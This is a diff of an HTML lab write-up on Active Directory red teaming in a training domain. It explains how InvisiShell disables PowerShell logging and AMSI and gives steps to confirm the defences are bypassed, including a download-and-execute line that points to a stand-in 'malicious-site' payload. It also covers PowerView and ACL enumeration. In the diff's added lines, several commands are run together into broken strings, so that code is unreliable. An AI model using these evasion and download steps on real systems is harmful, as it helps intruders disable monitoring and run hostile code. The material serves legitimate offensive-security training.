@@ -396,11 +396,10 @@
 <li><strong>System-wide transcription</strong> logs all PowerShell commands and their output.</li>
 <li><strong>Script block logging</strong> records the content of PowerShell scripts.</li>
 <li><strong>AMSI</strong> scans scripts for malicious content before they are executed.</li>
-<li><strong>Hooking .NET Assemblies</strong>: InvisiShell achieves its bypass by hooking into the .NET assemblies <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>. - This is accomplished using a <strong>CLR (Common Language Runtime) profiler API</strong>. - A <strong>CLR profiler</strong> is a DLL loaded by the CLR at runtime to intercept and modify the behavior of these assemblies via the profiling API. - <strong>Methods of Use</strong>: InvisiShell can be launched in two ways, depending on the user's privileges: - <strong>With administrator privileges</strong>: The<code>RunWithPathAsAdmin.bat</code>script is used. - <strong>Without administrator privileges</strong>: The<code>RunWithRegistryNonAdmin.bat</code>script is used. This method creates a CLR profiler and starts a new PowerShell session with disabled logging. - <strong>Incapacitating Security Features</strong>: By hooking into these .NET assemblies, <strong>InvisiShell disables system-wide transcription, AMSI, and script block logging</strong> for the current PowerShell session. - <strong>Avoiding Detection</strong>: When using InvisiShell, the tool hooks to<code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>, which allows it to avoid system-wide transcription, script block logging, and AMSI. - <strong>Integration with Other Tools</strong>: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts. - <strong>Clean-up Process</strong>: To complete the clean-up, users must type<code>exit</code>in the new PowerShell session created by InvisiShell. - <strong>Modified Version</strong>: The class uses a slightly modified version of InvisiShell. - <strong>Location of Tools</strong>: All the tools, including InvisiShell, used in the lab environment are located in the<code>C:\AD</code>directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded. - <strong>InvisiShell and Binaries</strong>: It is noted that binaries like<code>Rubeus.exe</code>may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt. - <strong>Example Usage</strong>: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine. In summary, <strong>InvisiShell is essential for maintaining stealth in the lab environment</strong> by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software. It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine. If we are just a simple low level privileged user, then we should run<em> </em><code>RunWithRegistetyNonAdmin.ba</code><code>t</code><code>.</code></li>
+<li><strong>Hooking .NET Assemblies</strong>: InvisiShell achieves its bypass by hooking into the .NET assemblies <code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>. - This is accomplished using a <strong>CLR (Common Language Runtime) profiler API</strong>. - A <strong>CLR profiler</strong> is a DLL loaded by the CLR at runtime to intercept and modify the behavior of these assemblies via the profiling API. - <strong>Methods of Use</strong>: InvisiShell can be launched in two ways, depending on the user's privileges: - <strong>With administrator privileges</strong>: The<code>RunWithPathAsAdmin.bat</code>script is used. - <strong>Without administrator privileges</strong>: The<code>RunWithRegistryNonAdmin.bat</code>script is used. This method creates a CLR profiler and starts a new PowerShell session with disabled logging. - <strong>Incapacitating Security Features</strong>: By hooking into these .NET assemblies, <strong>InvisiShell disables system-wide transcription, AMSI, and script block logging</strong> for the current PowerShell session. - <strong>Avoiding Detection</strong>: When using InvisiShell, the tool hooks to<code>System.Management.Automation.dll</code> and <code>System.Core.dll</code>, which allows it to avoid system-wide transcription, script block logging, and AMSI. - <strong>Integration with Other Tools</strong>: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts. - <strong>Clean-up Process</strong>: To complete the clean-up, users must type<code>exit</code>in the new PowerShell session created by InvisiShell. - <strong>Modified Version</strong>: The class uses a slightly modified version of InvisiShell. - <strong>Location of Tools</strong>: All the tools, including InvisiShell, used in the lab environment are located in the<code>C:\AD</code>directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded. - <strong>InvisiShell and Binaries</strong>: It is noted that binaries like<code>Rubeus.exe</code>may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt. - <strong>Example Usage</strong>: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine. In summary, <strong>InvisiShell is essential for maintaining stealth in the lab environment</strong> by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software. It’s always good that we do run Invisi-Shell via cmd before we start doing our enumeration and right after script execution, Powershell will be executed. This script should be executed depending on the type of privilege we do have on the machine. If we are just a simple low level privileged user, then we should run<em> </em><code>RunWithRegistetyNonAdmin.bat.</code></li>
 </ul>
 </ul>
-<p>If we are a high level privileged user like Administrator for example, then we should run <code>RunWithPathAsAdmin.bat</code><code>.</code></p>
-<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<p>If we are a high level privileged user like Administrator for example, then we should run <code>RunWithPathAsAdmin.bat.RunWithRegistryNonAdmin.bat</code></p>
 <img src="./images/screenshot_3.png" alt="image">
 <p>To verify whether <strong>InvisiShell</strong> has successfully bypassed the intended PowerShell defenses (e.g., logging mechanisms, AMSI, or other detection features), you can perform targeted tests to validate its effectiveness. Here's a step-by-step guide to check what defenses you were able to bypass and confirm whether InvisiShell is working properly:</p>
 <h3><strong>1. Validate PowerShell Logging (Script Block Logging & Transcription)</strong></h3>
@@ -412,49 +411,66 @@
 <li>Execute a simple or obfuscated PowerShell command or script, such as:</li>
 </ul>
 </ol>
-<pre><code class="language-powershell-[system.net.dns]::gethostaddresses("example.com")```">
-  - Check the **Windows Event Log** under:</code></pre>
+<p><code>powershell [System.Net.Dns]::GetHostAddresses("example.com")</code></p>
+<ul>
+<li>Check the <strong>Windows Event Log</strong> under:</li>
+</ul>
+</ul>
+<p><code>plain text Applications and Services Logs > Microsoft > Windows > PowerShell > Operational</code></p>
 <ul>
 <li>If <strong>InvisiShell</strong> is working, no entries related to your script should appear in the event logs, even if Script Block Logging is enabled.</li>
 <li><strong>Transcription Test</strong>:</li>
 <li>Look for transcription logs in the configured directory (defined by Group Policy or registry settings). By default, these logs might be stored in:</li>
 </ul>
 </ul>
-<pre><code class="language-plain-text-%userprofile%\documents\powershell_transcript```">
-  - If **InvisiShell** is bypassing transcription, there should be no logs created for your session.
-### **2. Validate AMSI Bypass**
-
-AMSI scans the script content in memory before execution. You can confirm whether AMSI is disabled or bypassed.
-### **Steps:**
-
-1. Run a script known to trigger AMSI, such as one containing flagged keywords:</code></pre>
+<p><code>plain text %USERPROFILE%\Documents\PowerShell_transcript</code></p>
+<ul>
+<li>If <strong>InvisiShell</strong> is bypassing transcription, there should be no logs created for your session.</li>
+</ul>
+</ul>
+<h3><strong>2. Validate AMSI Bypass</strong></h3>
+<p>AMSI scans the script content in memory before execution. You can confirm whether AMSI is disabled or bypassed.</p>
+<h3><strong>Steps:</strong></h3>
+<ol>
+<li>Run a script known to trigger AMSI, such as one containing flagged keywords:</li>
+</ol>
+<p><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')</code></p>
 <ol>
 <li>Without InvisiShell, this should trigger an AMSI detection and display a warning like:</li>
 </ol>
-<pre><code class="language-plain-text-this-script-contains-malicious-content-and-has-been-blocked-by-your-antivirus-software.```">
-1. If **InvisiShell** is active and bypassing AMSI, the script should execute without any warning or blocking.
-### **3. Validate Constrained Language Mode (CLM)**
-
-If CLM is enforced, it restricts advanced features like custom .NET assemblies and cmdlets.
-### **Steps:**
-
-1. Check if CLM is enforced by running:</code></pre>
+<p><code>plain text This script contains malicious content and has been blocked by your antivirus software.</code></p>
+<ol>
+<li>If <strong>InvisiShell</strong> is active and bypassing AMSI, the script should execute without any warning or blocking.</li>
+</ol>
+<h3><strong>3. Validate Constrained Language Mode (CLM)</strong></h3>
+<p>If CLM is enforced, it restricts advanced features like custom .NET assemblies and cmdlets.</p>
+<h3><strong>Steps:</strong></h3>
+<ol>
+<li>Check if CLM is enforced by running:</li>
+</ol>
+<p><code>powershell $ExecutionContext.SessionState.LanguageMode</code></p>
 <ul>
 <li><strong>FullLanguage</strong>: No CLM restrictions.</li>
 <li><strong>ConstrainedLanguage</strong>: CLM is enforced.</li>
 <li>Try to execute a command that requires full language mode, such as:</li>
 </ul>
 </ul>
-<pre><code class="language-powershell-add-type--typedefinition-'public-class-test-{-public-string-hello()-{-return-"hello";-}-}'```">
-  - If CLM is bypassed, the command should succeed.
-  - If not, CLM is still enforced, and you'll see an error.
-### **4. Check Registry and Configurations**
-
-InvisiShell relies on registry modifications and hooking into PowerShell processes.
-### **Steps:**
-
-1. Verify Registry Modifications:
-  - Check if the custom **COR_PROFILER** and related registry keys were added:</code></pre>
+<p><code>powershell Add-Type -TypeDefinition 'public class Test { public string Hello() { return "Hello"; } }'</code></p>
+<ul>
+<li>If CLM is bypassed, the command should succeed.</li>
+<li>If not, CLM is still enforced, and you'll see an error.</li>
+</ul>
+</ul>
+<h3><strong>4. Check Registry and Configurations</strong></h3>
+<p>InvisiShell relies on registry modifications and hooking into PowerShell processes.</p>
+<h3><strong>Steps:</strong></h3>
+<ol>
+<li>Verify Registry Modifications:</li>
+<ul>
+<li>Check if the custom <strong>COR_PROFILER</strong> and related registry keys were added:</li>
+</ul>
+</ol>
+<p><code>plain text HKEY<em>CURRENT</em>USER\Software\Classes\CLSID\<GUID>\InprocServer32</code></p>
 <ul>
 <li>Confirm the custom profiler (e.g., <code>InShellProf.dll</code>) is loaded by inspecting the registry and the DLL path. 1. Validate DLL Injection: - Use tools like <strong>Process Explorer</strong> or <strong>Process Monitor</strong> to check if the<code>InShellProf.dll</code> file is loaded into the PowerShell process.</li>
 </ul>
@@ -502,12 +518,9 @@ InvisiShell relies on registry modifications and hooking into PowerShell process
 <p>For this module importing mechanism we do have 2 ways:</p>
 <p>Pay attention that dot sourcing with only work with extentions like <code>.ps1</code>, <code>.psd1</code> and the Import-Module with work with all the extentions like, <code>.ps1</code>, <code>.psd1</code>, <code>.dll</code>, and so on.</p>
 <p>1 - First option is using a dot sourcing mechanism.</p>
-<p><code>. .\PowerView.ps1</code></p>
-<p><code>. .\ActiveDirectory.psd1</code></p>
+<p><code>. .\PowerView.ps1. .\ActiveDirectory.psd1</code></p>
 <p>2 - Second option is using Import-Module. Import ADModule in the following sequence <code>.dll</code> then <code>.psd1</code>.</p>
-<p><code>Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</code></p>
-<p><code>Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p>
-<p><code>Import-Module .\PowerView.ps1</code></p>
+<p><code>Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dllImport-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1Import-Module .\PowerView.ps1</code></p>
 <img src="./images/screenshot_4.png" alt="image">
 <p>On the screenshot above, it is possible to see that we used the 2 ways to import ADModule and PowerView as well.</p>
 <h3><strong>Enumerating Users, Computers and groups</strong></h3>
@@ -809,8 +822,7 @@ InvisiShell relies on registry modifications and hooking into PowerShell process
 <p>Now let’s do something interesting here. Since we are a valid domain user, let’s see if we do have any valid or modified RIGHTS/PERMISSIONS on object inside the domain.</p>
 <p>We are studentuser163, so in this case we will be checking, what permissions our user has in this domain.</p>
 <p>All we need to do is to filter based on our username.</p>
-<p>> <code>Note: Please pay attention that, this type of query may take some time to finish.</code></p>
-<p><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'studentuser163'}</code></p>
+<p>> <code>Note: Please pay attention that, this type of query may take some time to finish.Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'studentuser163'}</code></p>
 <img src="./images/screenshot_27.png" alt="image">
 <p>Above we can see that we have not received any output, it means that our current user <code>studentuser163</code> does not contain any RIGHT or PERMISSION on any object inside <code>us.techcorp.local</code> domain.</p>
 <p>Let’s now try the same query, but, this type let’s check rights and permissions of the group <code>StudentsUsers</code>, which is the group where our <code>studentuser163</code> is MemberOf.</p>
